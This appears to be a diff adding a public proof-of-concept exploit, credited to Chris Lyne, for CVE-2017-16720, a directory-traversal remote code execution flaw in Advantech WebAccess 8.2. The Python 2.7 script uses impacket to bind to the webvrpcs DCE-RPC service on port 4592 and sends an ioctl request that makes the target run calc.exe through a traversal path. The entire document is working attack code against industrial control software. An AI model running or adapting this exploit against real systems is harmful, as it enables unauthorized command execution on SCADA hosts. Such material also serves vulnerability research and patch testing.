@@ -1,0 +1,74 @@
+#!/usr/bin/python2.7
+  
+# Exploit Title: Advantech WebAccess < 8.3 webvrpcs Directory Traversal RCE Vulnerability
+# Date: 03-11-2018
+# Exploit Author: Chris Lyne (@lynerc)
+# Vendor Homepage: www.advantech.com
+# Software Link: http://advcloudfiles.advantech.com/web/Download/webaccess/8.2/AdvantechWebAccessUSANode8.2_20170817.exe
+# Version: Advantech WebAccess 8.2-2017.08.18
+# Tested on: Windows Server 2008 R2 Enterprise 64-bit
+# CVE : CVE-2017-16720
+# See Also: https://www.zerodayinitiative.com/advisories/ZDI-18-024/
+
+import sys, struct
+from impacket import uuid
+from impacket.dcerpc.v5 import transport
+
+def call(dce, opcode, stubdata):
+  dce.call(opcode, stubdata)
+  res = -1
+  try:
+    res = dce.recv()
+  except Exception, e:
+    print "Exception encountered..." + str(e)
+    sys.exit(1)
+  return res
+
+if len(sys.argv) != 2:
+  print "Provide only host arg"
+  sys.exit(1)
+
+port = 4592
+interface = "5d2b62aa-ee0a-4a95-91ae-b064fdb471fc"
+version = "1.0" 
+
+host = sys.argv[1]
+
+string_binding = "ncacn_ip_tcp:%s" % host
+trans = transport.DCERPCTransportFactory(string_binding)
+trans.set_dport(port)
+
+dce = trans.get_dce_rpc()
+dce.connect()
+
+print "Binding..."
+iid = uuid.uuidtup_to_bin((interface, version))
+dce.bind(iid)
+
+print "...1"
+stubdata = struct.pack("<III", 0x00, 0xc351, 0x04)
+call(dce, 2, stubdata)
+
+print "...2"
+stubdata = struct.pack("<I", 0x02)
+res = call(dce, 4, stubdata)
+if res == -1:
+  print "Something went wrong"
+  sys.exit(1)
+res = struct.unpack("III", res)
+
+if (len(res) < 3):
+  print "Received unexpected length value"
+  sys.exit(1)
+
+print "...3"
+# ioctl 0x2711
+stubdata = struct.pack("<IIII", res[2], 0x2711, 0x204, 0x204)
+command = "..\\..\\windows\\system32\\calc.exe"
+fmt = "<" + str(0x204) + "s"
+stubdata += struct.pack(fmt, command)
+call(dce, 1, stubdata)
+
+print "\nDid it work?"
+
+dce.disconnect()
